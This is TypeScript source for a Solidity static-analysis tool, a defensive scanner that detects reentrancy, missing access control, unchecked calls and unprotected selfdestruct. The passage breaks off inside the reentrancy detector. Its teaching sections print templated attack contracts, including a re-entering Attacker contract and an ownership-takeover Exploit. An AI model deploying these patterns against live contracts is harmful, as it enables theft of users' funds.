import * as parser from '@solidity-parser/parser';
import {
  ParsedContract,
  ContractInfo,
  FunctionInfo,
  StateVariableInfo,
  ModifierInfo,
  ParameterInfo,
  Vulnerability,
  VulnerabilityType,
  AnalysisResult,
  ConfidenceLevel,
  VulnerabilityMetadata,
  SafetyCheck,
  AnalysisLimitations,
  FixSuggestion,
  EducationalContent,
} from './types';

// ============= CONFIDENCE SCORING =============

function scoreToConfidenceLevel(score: number): ConfidenceLevel {
  if (score >= 70) return 'confirmed';
  if (score >= 40) return 'likely';
  return 'theoretical';
}

// Static limitations that apply to all analyses
const ANALYSIS_LIMITATIONS: AnalysisLimitations = {
  covered: [
    'Reentrancy via external calls (.call, .send, .delegatecall)',
    'Missing access control on sensitive functions',
    'Unchecked external call return values',
    'Unprotected selfdestruct calls',
    'Integer overflow/underflow (Solidity < 0.8.0)',
  ],
  notCovered: [
    'Governance attacks (malicious proposals)',
    'Social engineering (phishing, key theft)',
    'Oracle manipulation (off-chain data feeds)',
    'Flash loan attacks',
    'Front-running / MEV attacks',
    'Time-based attacks (timestamp manipulation)',
    'Malicious proxy upgrades',
    'Business logic flaws',
    'Economic attacks requiring market conditions',
    'Cross-contract vulnerabilities',
    'Off-chain dependencies',
  ],
  disclaimer: 'This tool performs static pattern analysis only. For comprehensive security, a professional audit is required. This tool is ONE layer of defense, not a complete security solution.',
};

// ============= REENTRANCY FIX SUGGESTIONS =============

function generateReentrancyFixSuggestions(functionName: string): FixSuggestion[] {
  return [
    {
      name: 'Checks-Effects-Interactions (CEI) Pattern',
      description: 'Reorder code to update state before making external calls. This is the recommended approach with zero gas overhead.',
      vulnerableCode: `function ${functionName}() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "No balance");

    // VULNERABLE: External call BEFORE state update
    (bool success, ) = msg.sender.call{value: bal}("");
    require(success, "Transfer failed");

    balances[msg.sender] = 0;  // TOO LATE!
}`,
      fixedCode: `function ${functionName}() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0, "No balance");

    // SAFE: State update BEFORE external call
    balances[msg.sender] = 0;

    (bool success, ) = msg.sender.call{value: bal}("");
    require(success, "Transfer failed");
}`,
      gasImpact: 'None',
      pros: ['No additional gas cost', 'Follows industry best practices', 'No external dependencies'],
      cons: ['Requires careful code review', 'Must ensure ALL state is updated first'],
      recommended: true,
    },
    {
      name: 'ReentrancyGuard (OpenZeppelin)',
      description: 'Use OpenZeppelin\'s battle-tested ReentrancyGuard modifier to prevent reentrancy attacks.',
      vulnerableCode: `contract Vault {
    function ${functionName}() external {
        // Vulnerable to reentrancy
    }
}`,
      fixedCode: `import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function ${functionName}() external nonReentrant {
        // Protected by ReentrancyGuard
        // Even if external call is before state update,
        // recursive calls will revert
    }
}`,
      gasImpact: '+2,300 gas per call',
      pros: ['Battle-tested and widely audited', 'Easy to implement', 'Works regardless of code order'],
      cons: ['Adds external dependency', 'Gas overhead on every call', 'Must inherit from contract'],
      recommended: false,
    },
    {
      name: 'Mutex Lock (Manual)',
      description: 'Implement a simple boolean lock to prevent reentrant calls. Lightweight alternative to OpenZeppelin.',
      vulnerableCode: `contract Vault {
    function ${functionName}() external {
        // Vulnerable to reentrancy
    }
}`,
      fixedCode: `contract Vault {
    bool private locked;

    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function ${functionName}() external noReentrant {
        // Protected by mutex lock
    }
}`,
      gasImpact: '+200 gas per call',
      pros: ['Simple to understand', 'No external dependencies', 'Minimal gas overhead'],
      cons: ['Must remember to add modifier', 'Manual implementation risk', 'Not as widely audited'],
      recommended: false,
    },
    {
      name: 'Pull-over-Push Pattern',
      description: 'Instead of pushing funds to users, let them pull (withdraw) their own funds. This is the safest pattern but requires architectural changes.',
      vulnerableCode: `// PUSH pattern (vulnerable)
function distribute(address[] recipients) external {
    for (uint i = 0; i < recipients.length; i++) {
        recipients[i].call{value: amounts[i]}("");
    }
}`,
      fixedCode: `// PULL pattern (safe)
mapping(address => uint256) public pendingWithdrawals;

function claimable(address user) external view returns (uint256) {
    return pendingWithdrawals[user];
}

function ${functionName}() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    pendingWithdrawals[msg.sender] = 0;

    // User pulls their own funds
    payable(msg.sender).transfer(amount);
}`,
      gasImpact: 'None (may reduce overall gas)',
      pros: ['Safest pattern', 'User controls when to withdraw', 'Works well with gas limits'],
      cons: ['Requires architectural refactor', 'Users must initiate withdrawal', 'More complex UX'],
      recommended: false,
    },
  ];
}

// ============= REENTRANCY EDUCATIONAL CONTENT =============

function generateReentrancyEducation(functionName: string, contractName: string): EducationalContent {
  return {
    realWorldExample: {
      name: 'The DAO Hack',
      date: 'June 17, 2016',
      impact: '$60 million stolen (3.6 million ETH)',
      description: `The DAO was a decentralized venture capital fund on Ethereum. An attacker exploited a reentrancy vulnerability in the splitDAO() function, which allowed withdrawing funds before the balance was updated. The attacker recursively called the withdraw function, draining approximately 3.6 million ETH. This led to the controversial Ethereum hard fork, splitting the chain into ETH and ETC.`,
    },
    attackFlow: [
      {
        step: 1,
        title: 'Setup',
        description: `Attacker deploys a malicious contract with a receive() or fallback() function that calls ${contractName}.${functionName}() when it receives ETH.`,
        codeSnippet: `contract Attacker {
    ${contractName} target;

    constructor(address _target) {
        target = ${contractName}(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.${functionName}();
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.${functionName}();  // Re-enter!
        }
    }
}`,
      },
      {
        step: 2,
        title: 'Attack Execution',
        description: `When ${functionName}() sends ETH to the attacker contract, the receive() function is triggered. Since the victim's balance hasn't been updated yet, the attacker can call ${functionName}() again, receiving more ETH each time.`,
        codeSnippet: `// In victim contract:
function ${functionName}() external {
    uint256 bal = balances[msg.sender];

    // 1. Check passes (attacker has balance)
    require(bal > 0);

    // 2. Send ETH - triggers attacker's receive()
    msg.sender.call{value: bal}("");
    //    └─> Attacker re-enters here!

    // 3. This line never reached during attack
    balances[msg.sender] = 0;
}`,
      },
      {
        step: 3,
        title: 'Impact',
        description: 'The attacker drains the contract by repeatedly withdrawing before their balance is set to zero. With 1 ETH deposited, an attacker can drain the entire contract balance.',
        codeSnippet: `// Attack flow:
// 1. Attacker deposits 1 ETH
// 2. Attacker calls withdraw()
// 3. Contract sends 1 ETH → triggers receive()
// 4. receive() calls withdraw() again
// 5. Contract sends another 1 ETH (balance still shows 1!)
// 6. Repeat until contract is empty
// 7. Finally, balances[attacker] = 0 executes

// Result: From 1 ETH, attacker steals entire contract balance`,
      },
    ],
    keyLesson: 'Always follow the Checks-Effects-Interactions pattern: perform all state changes (effects) before making external calls (interactions). The check-then-update-then-call order prevents reentrancy attacks.',
  };
}

// ============= ACCESS CONTROL FIX SUGGESTIONS =============

function generateAccessControlFixSuggestions(functionName: string, isOwnershipFunction: boolean): FixSuggestion[] {
  return [
    {
      name: 'Ownable Pattern (OpenZeppelin)',
      description: 'Use OpenZeppelin\'s Ownable contract for simple single-owner access control. This is the recommended approach for most cases.',
      vulnerableCode: `// VULNERABLE - No access control
function ${functionName}(${isOwnershipFunction ? 'address newOwner' : ''}) public {
    ${isOwnershipFunction ? 'owner = newOwner;' : '// Critical operation without restriction'}
}`,
      fixedCode: `import "@openzeppelin/contracts/access/Ownable.sol";

contract MyContract is Ownable {
    function ${functionName}(${isOwnershipFunction ? 'address newOwner' : ''}) public onlyOwner {
        ${isOwnershipFunction ? '_transferOwnership(newOwner);' : '// Now only owner can call'}
    }
}`,
      gasImpact: '+2,400 gas per call',
      pros: ['Battle-tested and audited', 'Industry standard', 'Includes ownership transfer logic', 'Easy to implement'],
      cons: ['Single owner only', 'External dependency', 'Gas overhead'],
      recommended: true,
    },
    {
      name: 'Manual require(msg.sender)',
      description: 'Simple inline check using require statement. No external dependencies but requires manual implementation.',
      vulnerableCode: `function ${functionName}() public {
    // No access control - anyone can call
}`,
      fixedCode: `address public owner;

constructor() {
    owner = msg.sender;
}

function ${functionName}() public {
    require(msg.sender == owner, "Not authorized");
    // Now only owner can execute
}`,
      gasImpact: '+200 gas per call',
      pros: ['No external dependencies', 'Simple to understand', 'Minimal gas overhead', 'Full control'],
      cons: ['Must implement manually', 'Easy to forget', 'No built-in transfer logic', 'Not audited'],
      recommended: false,
    },
    {
      name: 'AccessControl (Role-Based)',
      description: 'OpenZeppelin\'s AccessControl for multiple roles and fine-grained permissions. Best for complex systems.',
      vulnerableCode: `function ${functionName}() public {
    // No role-based access control
}`,
      fixedCode: `import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyContract is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

    constructor() {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(ADMIN_ROLE, msg.sender);
    }

    function ${functionName}() public onlyRole(ADMIN_ROLE) {
        // Only accounts with ADMIN_ROLE can call
    }
}`,
      gasImpact: '+5,000 gas per call',
      pros: ['Multiple roles supported', 'Fine-grained control', 'Role hierarchy', 'Audited by OpenZeppelin'],
      cons: ['More complex', 'Higher gas cost', 'Overkill for simple cases'],
      recommended: false,
    },
    {
      name: 'Custom Modifier',
      description: 'Create a reusable modifier for access control. Good balance between simplicity and reusability.',
      vulnerableCode: `function ${functionName}() public {
    // No modifier protection
}`,
      fixedCode: `address public owner;

modifier onlyOwner() {
    require(msg.sender == owner, "Caller is not owner");
    _;
}

constructor() {
    owner = msg.sender;
}

function ${functionName}() public onlyOwner {
    // Protected by modifier
}

function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0), "Invalid address");
    owner = newOwner;
}`,
      gasImpact: '+200 gas per call',
      pros: ['Reusable across functions', 'Clear intent', 'No dependencies', 'Customizable'],
      cons: ['Must implement correctly', 'Not externally audited', 'Manual ownership transfer'],
      recommended: false,
    },
  ];
}

// ============= ACCESS CONTROL EDUCATIONAL CONTENT =============

function generateAccessControlEducation(functionName: string, contractName: string, isOwnershipFunction: boolean): EducationalContent {
  return {
    realWorldExample: {
      name: 'Poly Network Hack',
      date: 'August 10, 2021',
      impact: '$611 million stolen (largest DeFi hack)',
      description: `The Poly Network cross-chain bridge was exploited due to a critical access control vulnerability. The attacker was able to call a privileged function that changed the "keeper" role to their own address. Once they controlled the keeper role, they could authorize fraudulent cross-chain transfers, draining funds from multiple chains (Ethereum, BSC, Polygon). The vulnerability was a missing access control check on a function that should have been restricted to trusted keepers only.`,
    },
    attackFlow: [
      {
        step: 1,
        title: 'Discovery',
        description: `Attacker identifies that ${contractName}.${functionName}() lacks proper access control and can be called by anyone.`,
        codeSnippet: `// Attacker scans the contract and finds:
function ${functionName}(${isOwnershipFunction ? 'address newOwner' : ''}) public {
    // No onlyOwner modifier!
    // No require(msg.sender == owner)!
    ${isOwnershipFunction ? 'owner = newOwner;  // Anyone can become owner!' : '// Critical operation exposed!'}
}`,
      },
      {
        step: 2,
        title: 'Exploitation',
        description: `Attacker calls the unprotected function directly, ${isOwnershipFunction ? 'setting themselves as the new owner' : 'executing the privileged operation'}.`,
        codeSnippet: `// Attacker's transaction:
contract Exploit {
    function attack(address target) external {
        // Simply call the unprotected function
        ${contractName}(target).${functionName}(${isOwnershipFunction ? 'msg.sender' : ''});
        ${isOwnershipFunction ? '// Attacker is now the owner!' : ''}
    }
}`,
      },
      {
        step: 3,
        title: 'Impact',
        description: isOwnershipFunction
          ? 'With owner privileges, the attacker can now drain all funds, pause the contract, change critical parameters, or brick the contract entirely.'
          : 'The attacker executes the privileged operation, potentially draining funds, corrupting state, or disrupting the protocol.',
        codeSnippet: `// After gaining control:
${isOwnershipFunction ? `// Step 1: Attacker is now owner
// Step 2: Call withdraw() to drain funds
// Step 3: Protocol users lose everything

// Real impact from Poly Network:
// - $273M on Ethereum
// - $253M on BSC
// - $85M on Polygon
// Total: $611M stolen` : `// Attacker executes privileged operation
// without any authorization
// Protocol integrity compromised`}`,
      },
    ],
    keyLesson: 'Every function that modifies critical state (ownership, funds, parameters) MUST have explicit access control. Use battle-tested patterns like OpenZeppelin\'s Ownable or AccessControl. Never assume a function is "internal" just because it\'s not meant to be called publicly.',
  };
}

// ============= UNCHECKED CALL FIX SUGGESTIONS =============

function generateUncheckedCallFixSuggestions(functionName: string): FixSuggestion[] {
  return [
    {
      name: 'Check Return Value with require()',
      description: 'Always check the return value of low-level calls and revert on failure. This is the most straightforward fix.',
      vulnerableCode: `function ${functionName}() external {
    // VULNERABLE: Return value ignored!
    payable(msg.sender).call{value: amount}("");
    balance = 0;  // Executes even if call failed
}`,
      fixedCode: `function ${functionName}() external {
    // SAFE: Check return value
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Transfer failed");
    balance = 0;  // Only executes if call succeeded
}`,
      gasImpact: 'None',
      pros: ['Simple and clear', 'No external dependencies', 'Industry standard', 'Immediate revert on failure'],
      cons: ['Must remember for every call', 'Entire transaction reverts on failure'],
      recommended: true,
    },
    {
      name: 'Use transfer() (Limited Gas)',
      description: 'Use transfer() which automatically reverts on failure. Limited to 2300 gas, preventing reentrancy.',
      vulnerableCode: `function ${functionName}() external {
    // Using call without checking
    msg.sender.call{value: amount}("");
}`,
      fixedCode: `function ${functionName}() external {
    // transfer() reverts on failure automatically
    payable(msg.sender).transfer(amount);
}`,
      gasImpact: 'None (limits forwarded gas to 2300)',
      pros: ['Auto-reverts on failure', 'Prevents reentrancy', 'Simple syntax'],
      cons: ['Only 2300 gas forwarded', 'May fail with contract recipients', 'Not recommended for all cases'],
      recommended: false,
    },
    {
      name: 'Use OpenZeppelin Address Library',
      description: 'OpenZeppelin\'s Address library provides sendValue() which safely sends ETH with proper error handling.',
      vulnerableCode: `function ${functionName}() external {
    msg.sender.call{value: amount}("");
}`,
      fixedCode: `import "@openzeppelin/contracts/utils/Address.sol";

using Address for address payable;

function ${functionName}() external {
    // Safe transfer with built-in checks
    payable(msg.sender).sendValue(amount);
}`,
      gasImpact: '+100 gas',
      pros: ['Battle-tested', 'Clear semantics', 'Handles edge cases', 'Well-documented'],
      cons: ['External dependency', 'Slight gas overhead'],
      recommended: false,
    },
    {
      name: 'Custom Error Handling',
      description: 'Handle failures gracefully without reverting. Useful for batch operations where one failure shouldn\'t stop others.',
      vulnerableCode: `function ${functionName}() external {
    msg.sender.call{value: amount}("");
}`,
      fixedCode: `event TransferFailed(address recipient, uint256 amount);

function ${functionName}() external {
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    if (!success) {
        // Log failure but don't revert
        emit TransferFailed(msg.sender, amount);
        // Optionally: store for retry
        pendingWithdrawals[msg.sender] += amount;
    } else {
        balance = 0;
    }
}`,
      gasImpact: '+2,000 gas (for event)',
      pros: ['Transaction continues on failure', 'Good for batch operations', 'Can implement retry logic'],
      cons: ['More complex', 'Must handle pending state', 'Not always appropriate'],
      recommended: false,
    },
  ];
}

// ============= UNCHECKED CALL EDUCATIONAL CONTENT =============

function generateUncheckedCallEducation(functionName: string, contractName: string): EducationalContent {
  return {
    realWorldExample: {
      name: 'King of the Ether Throne',
      date: 'February 2016',
      impact: 'Funds permanently locked',
      description: `The King of the Ether Throne game used send() to transfer the throne to new kings. However, when a contract became king (instead of an EOA), the send() would fail silently because contracts need a receive() function. The game didn't check the return value, so it continued as if the transfer succeeded. This caused the game to break and funds to become stuck. While not a theft, it demonstrated how unchecked calls can lead to permanent fund loss.`,
    },
    attackFlow: [
      {
        step: 1,
        title: 'Vulnerable Pattern',
        description: `The ${contractName}.${functionName}() function uses a low-level call without checking if it succeeded.`,
        codeSnippet: `// The vulnerable code:
function ${functionName}() external {
    // BUG: Return value not checked!
    msg.sender.call{value: amount}("");

    // This runs even if the call FAILED
    balance = 0;
}`,
      },
      {
        step: 2,
        title: 'Silent Failure',
        description: 'Low-level calls (.call, .send) return false on failure instead of reverting. If unchecked, the contract continues as if nothing went wrong.',
        codeSnippet: `// What actually happens:
(bool success, ) = msg.sender.call{value: amount}("");
// success = false (transfer failed!)
// But we never check it...

balance = 0;  // Balance zeroed, but ETH never sent!`,
      },
      {
        step: 3,
        title: 'Impact',
        description: 'The contract\'s accounting becomes incorrect. Funds may be stuck forever, or users may be credited for transfers that never happened.',
        codeSnippet: `// Result:
// - Contract thinks it sent the ETH
// - Recipient never received it
// - Accounting is broken
// - Funds may be stuck forever
// - No way to recover without migration

// Real-world consequences:
// - King of Ether: Game permanently broken
// - User funds inaccessible
// - Protocol reputation damaged`,
      },
    ],
    keyLesson: 'ALWAYS check the return value of low-level calls (.call, .send, .delegatecall). Use require(success) or handle failure explicitly. Consider using transfer() or OpenZeppelin\'s Address.sendValue() for safer ETH transfers.',
  };
}

// ============= SELFDESTRUCT FIX SUGGESTIONS =============

function generateSelfdestructFixSuggestions(functionName: string): FixSuggestion[] {
  return [
    {
      name: 'Add Access Control',
      description: 'Restrict selfdestruct to owner only using a modifier.',
      vulnerableCode: `// VULNERABLE: Anyone can destroy
function ${functionName}() external {
    selfdestruct(payable(msg.sender));
}`,
      fixedCode: `modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}

function ${functionName}() external onlyOwner {
    selfdestruct(payable(owner));
}`,
      gasImpact: '+200 gas',
      pros: ['Simple fix', 'Prevents unauthorized destruction', 'Standard pattern'],
      cons: ['Owner can still destroy', 'Consider if selfdestruct is needed at all'],
      recommended: true,
    },
    {
      name: 'Remove Selfdestruct Entirely',
      description: 'Consider if selfdestruct is actually needed. In most cases, it\'s not required and adds risk.',
      vulnerableCode: `function ${functionName}() external {
    selfdestruct(payable(msg.sender));
}`,
      fixedCode: `// Simply remove the selfdestruct function
// If you need to stop the contract, use a pause mechanism:

bool public paused;

function pause() external onlyOwner {
    paused = true;
}

function emergencyWithdraw() external onlyOwner {
    require(paused, "Must be paused");
    payable(owner).transfer(address(this).balance);
}`,
      gasImpact: 'None',
      pros: ['Eliminates risk entirely', 'Contract remains for historical reference', 'Better for upgradeable patterns'],
      cons: ['Contract code stays on-chain forever', 'Gas costs for storage remain'],
      recommended: false,
    },
    {
      name: 'Multi-Sig Requirement',
      description: 'Require multiple signatures before allowing selfdestruct.',
      vulnerableCode: `function ${functionName}() external {
    selfdestruct(payable(msg.sender));
}`,
      fixedCode: `mapping(address => bool) public destroyApprovals;
uint256 public approvalCount;
uint256 public constant REQUIRED_APPROVALS = 3;

function approveDestroy() external onlyAdmin {
    require(!destroyApprovals[msg.sender], "Already approved");
    destroyApprovals[msg.sender] = true;
    approvalCount++;
}

function ${functionName}() external onlyOwner {
    require(approvalCount >= REQUIRED_APPROVALS, "Need more approvals");
    selfdestruct(payable(owner));
}`,
      gasImpact: '+5,000 gas per approval',
      pros: ['Multiple parties must agree', 'Prevents single point of failure', 'Time to react to malicious attempts'],
      cons: ['Complex implementation', 'Coordination required', 'May be overkill for small contracts'],
      recommended: false,
    },
    {
      name: 'Timelock Pattern',
      description: 'Add a delay before selfdestruct can execute, giving users time to withdraw.',
      vulnerableCode: `function ${functionName}() external {
    selfdestruct(payable(msg.sender));
}`,
      fixedCode: `uint256 public destructionTime;
uint256 public constant TIMELOCK = 7 days;

function initiateDestruction() external onlyOwner {
    destructionTime = block.timestamp + TIMELOCK;
    emit DestructionInitiated(destructionTime);
}

function cancelDestruction() external onlyOwner {
    destructionTime = 0;
}

function ${functionName}() external onlyOwner {
    require(destructionTime != 0, "Not initiated");
    require(block.timestamp >= destructionTime, "Timelock active");
    selfdestruct(payable(owner));
}`,
      gasImpact: '+3,000 gas for timelock check',
      pros: ['Users have time to react', 'Can be cancelled', 'Industry best practice for critical operations'],
      cons: ['Delays emergency response', '7 days may be too long/short', 'More complex'],
      recommended: false,
    },
  ];
}

// ============= SELFDESTRUCT EDUCATIONAL CONTENT =============

function generateSelfdestructEducation(functionName: string, contractName: string): EducationalContent {
  return {
    realWorldExample: {
      name: 'Parity Wallet Freeze',
      date: 'November 6, 2017',
      impact: '$280 million frozen forever',
      description: `A developer accidentally called selfdestruct on the Parity multi-sig library contract while "playing around." This destroyed the library that all Parity multi-sig wallets depended on, permanently freezing approximately $280 million worth of ETH. The funds remain frozen to this day. This wasn't an attack but demonstrates the catastrophic consequences of unprotected selfdestruct.`,
    },
    attackFlow: [
      {
        step: 1,
        title: 'Vulnerable Contract',
        description: `The ${contractName} contract has a selfdestruct function that anyone can call.`,
        codeSnippet: `// The vulnerable code:
function ${functionName}() public {
    // NO ACCESS CONTROL!
    // Anyone can destroy this contract
    selfdestruct(payable(msg.sender));
}`,
      },
      {
        step: 2,
        title: 'Attack Execution',
        description: 'Attacker simply calls the function. Contract is destroyed, all ETH sent to attacker.',
        codeSnippet: `// Attacker's transaction:
${contractName} target = ${contractName}(vulnerableAddress);

// One line to steal everything:
target.${functionName}();

// Contract is now GONE
// All ETH transferred to attacker
// Code size = 0
// Irreversible`,
      },
      {
        step: 3,
        title: 'Permanent Damage',
        description: 'Unlike other attacks, selfdestruct is completely irreversible. The contract is gone forever.',
        codeSnippet: `// After selfdestruct:
// - Contract code: DELETED
// - Contract storage: DELETED
// - All ETH: STOLEN
// - User funds: LOST FOREVER
// - No recovery possible
// - No rollback (unless chain fork)

// Impact examples:
// - Parity Wallet: $280M frozen forever
// - Users can never withdraw
// - Protocol is permanently dead`,
      },
    ],
    keyLesson: 'Selfdestruct should NEVER be callable by arbitrary addresses. Always add access control (onlyOwner). Better yet, consider if selfdestruct is even needed - most contracts don\'t require it. If you must have it, use timelocks and multi-sig requirements.',
  };
}

// ============= PARSER =============

export function parseSource(source: string): { ast: unknown; parsed: ParsedContract } {
  const ast = parser.parse(source, {
    loc: true,
    range: true,
    tolerant: true,
  });

  const parsed = extractContractInfo(ast);
  return { ast, parsed };
}

function extractContractInfo(ast: unknown): ParsedContract {
  const result: ParsedContract = {
    contracts: [],
    pragmaVersion: null,
    imports: [],
  };

  const astNode = ast as { children?: unknown[] };
  for (const node of astNode.children || []) {
    const n = node as { type: string; name?: string; value?: string; path?: string };
    if (n.type === 'PragmaDirective' && n.name === 'solidity') {
      result.pragmaVersion = n.value || null;
    }
    if (n.type === 'ImportDirective') {
      result.imports.push(n.path || '');
    }
    if (n.type === 'ContractDefinition') {
      result.contracts.push(extractContract(node));
    }
  }

  return result;
}

function extractContract(node: unknown): ContractInfo {
  const n = node as {
    name: string;
    kind: string;
    baseContracts?: { baseName: { namePath: string } }[];
    subNodes?: unknown[];
  };

  const contract: ContractInfo = {
    name: n.name,
    kind: n.kind,
    baseContracts: (n.baseContracts || []).map((bc) => bc.baseName.namePath),
    functions: [],
    stateVariables: [],
    modifiers: [],
  };

  for (const subNode of n.subNodes || []) {
    const sub = subNode as { type: string; variables?: unknown[] };
    if (sub.type === 'FunctionDefinition') {
      contract.functions.push(extractFunction(subNode));
    }
    if (sub.type === 'StateVariableDeclaration') {
      for (const variable of sub.variables || []) {
        contract.stateVariables.push(extractStateVariable(variable, subNode));
      }
    }
    if (sub.type === 'ModifierDefinition') {
      contract.modifiers.push(extractModifier(subNode));
    }
  }

  return contract;
}

function extractFunction(node: unknown): FunctionInfo {
  const n = node as {
    name?: string;
    isConstructor?: boolean;
    isFallback?: boolean;
    visibility?: string;
    stateMutability?: string;
    modifiers?: { name: string }[];
    parameters?: unknown[];
    body?: unknown;
    loc?: { start?: { line: number } };
  };

  return {
    name: n.name || (n.isConstructor ? 'constructor' : n.isFallback ? 'fallback' : 'receive'),
    visibility: n.visibility || 'public',
    stateMutability: n.stateMutability || 'nonpayable',
    modifiers: (n.modifiers || []).map((m) => m.name),
    parameters: (n.parameters || []).map(extractParameter),
    body: n.body,
    line: n.loc?.start?.line || 0,
  };
}

function extractParameter(node: unknown): ParameterInfo {
  const n = node as { name?: string; typeName?: unknown };
  return {
    name: n.name || '',
    typeName: getTypeName(n.typeName),
  };
}

function extractStateVariable(variable: unknown, declaration: unknown): StateVariableInfo {
  const v = variable as { name: string; typeName?: unknown; visibility?: string };
  const d = declaration as { loc?: { start?: { line: number } } };
  return {
    name: v.name,
    typeName: getTypeName(v.typeName),
    visibility: v.visibility || 'internal',
    line: d.loc?.start?.line || 0,
  };
}

function extractModifier(node: unknown): ModifierInfo {
  const n = node as {
    name: string;
    parameters?: unknown[];
    loc?: { start?: { line: number } };
  };
  return {
    name: n.name,
    parameters: (n.parameters || []).map(extractParameter),
    line: n.loc?.start?.line || 0,
  };
}

function getTypeName(typeNode: unknown): string {
  if (!typeNode) return 'unknown';
  const t = typeNode as {
    type: string;
    name?: string;
    namePath?: string;
    keyType?: unknown;
    valueType?: unknown;
    baseTypeName?: unknown;
  };

  if (t.type === 'ElementaryTypeName') return t.name || 'unknown';
  if (t.type === 'UserDefinedTypeName') return t.namePath || 'unknown';
  if (t.type === 'Mapping') {
    return `mapping(${getTypeName(t.keyType)} => ${getTypeName(t.valueType)})`;
  }
  if (t.type === 'ArrayTypeName') {
    return `${getTypeName(t.baseTypeName)}[]`;
  }
  return 'unknown';
}

// ============= VULNERABILITY DETECTOR =============

let vulnerabilityCounter = 0;

function generateId(type: VulnerabilityType): string {
  vulnerabilityCounter++;
  return `${type.toUpperCase()}-${vulnerabilityCounter.toString().padStart(3, '0')}`;
}

export function detectVulnerabilities(parsed: ParsedContract): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];
  vulnerabilityCounter = 0;

  for (const contract of parsed.contracts) {
    if (contract.kind === 'interface' || contract.kind === 'library') continue;

    vulnerabilities.push(...detectReentrancy(contract));
    vulnerabilities.push(...detectAccessControl(contract));
    vulnerabilities.push(...detectUncheckedCalls(contract));
    vulnerabilities.push(...detectSelfdestruct(contract));
    vulnerabilities.push(...detectIntegerOverflow(contract, parsed.pragmaVersion));
  }

  return vulnerabilities;
}

interface ExternalCallInfo {
  type: string;
  line: number;
}

interface StateChangeInfo {
  variableName: string;
  line: number;
}

function findExternalCalls(body: unknown): ExternalCallInfo[] {
  const calls: ExternalCallInfo[] = [];

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      loc?: { start?: { line: number } };
    };

    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'FunctionCall') {
      let expr = n.expression as { type?: string; expression?: unknown; memberName?: string };
      if (expr?.type === 'NameValueExpression') {
        expr = (expr as { expression?: unknown }).expression as typeof expr;
      }
      if (expr?.type === 'MemberAccess') {
        const memberName = expr.memberName;
        if (['call', 'send', 'transfer', 'delegatecall', 'staticcall'].includes(memberName || '')) {
          calls.push({ type: memberName || '', line: currentLine || 0 });
        }
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return calls;
}

function findStateChanges(body: unknown): StateChangeInfo[] {
  const changes: StateChangeInfo[] = [];

  function getVariableName(node: unknown): string {
    const n = node as { type?: string; name?: string; base?: unknown; expression?: unknown; memberName?: string };
    if (n.type === 'Identifier') return n.name || 'unknown';
    if (n.type === 'IndexAccess') return getVariableName(n.base);
    if (n.type === 'MemberAccess') return `${getVariableName(n.expression)}.${n.memberName}`;
    return 'unknown';
  }

  function traverse(node: unknown, parentLine?: number) {
    if (!node) return;
    const n = node as {
      type?: string;
      expression?: unknown;
      operator?: string;
      left?: unknown;
      loc?: { start?: { line: number } };
    };

    const currentLine = n.loc?.start?.line || parentLine;

    if (n.type === 'ExpressionStatement') {
      const expr = n.expression as { type?: string; operator?: string; left?: unknown };
      if (expr?.type === 'BinaryOperation' && ['=', '+=', '-=', '*=', '/='].includes(expr.operator || '')) {
        const left = expr.left as { type?: string };
        if (left?.type === 'Identifier' || left?.type === 'IndexAccess') {
          changes.push({ variableName: getVariableName(left), line: currentLine || 0 });
        }
      }
    }

    if (n.type === 'BinaryOperation' && ['=', '+=', '-=', '*=', '/='].includes(n.operator || '')) {
      const left = n.left as { type?: string };
      if (left?.type === 'Identifier' || left?.type === 'IndexAccess') {
        changes.push({ variableName: getVariableName(left), line: currentLine || 0 });
      }
    }

    for (const key in n) {
      const val = (n as Record<string, unknown>)[key];
      if (val && typeof val === 'object') {
        if (Array.isArray(val)) {
          for (const child of val) traverse(child, currentLine);
        } else {
          traverse(val, currentLine);
        }
      }
    }
  }

  traverse(body);
  return changes;
}

function detectReentrancy(contract: ContractInfo): Vulnerability[] {
  const vulnerabilities: Vulnerability[] = [];
  const reentrancyGuardModifiers = ['nonReentrant', 'noReentrant', 'reentrancyGuard'];

  for (const func of contract.functions) {
    if (!func.body) continue;
    if (func.stateMutability === 'view' || func.stateMutability === 'pure') continue;

    const externalCalls = findExternalCalls(func.body);
    const stateChanges = findStateChanges(func.body);

    // Check for reentrancy guard modifier
    const hasReentrancyGuard = func.modifiers.some((mod) =>
      reentrancyGuardModifiers.some((guard) => mod.toLowerCase().includes(guard.toLowerCase()))
    );

    for (const call of externalCalls) {
      if (!['call', 'send', 'delegatecall'].includes(call.type)) continue;

      const stateChangesAfterCall = stateChanges.filter((sc) => sc.line > call.line);

      if (stateChangesAfterCall.length > 0) {
        // Calculate confidence score
        const confidenceFactors: string[] = [];
        let score = 20; // Base score

        // External call before state update is the key pattern
        score += 40;
        confidenceFactors.push('External call occurs before state update (+40)');

        // No reentrancy guard increases confidence
        if (!hasReentrancyGuard) {
          score += 20;
          confidenceFactors.push('No reentrancy guard modifier found (+20)');
        } else {
          score -= 30;
          confidenceFactors.push('Reentrancy guard modifier present (-30)');
        }

        // Balance-related state changes increase confidence
        const varName = stateChangesAfterCall[0].variableName.toLowerCase();
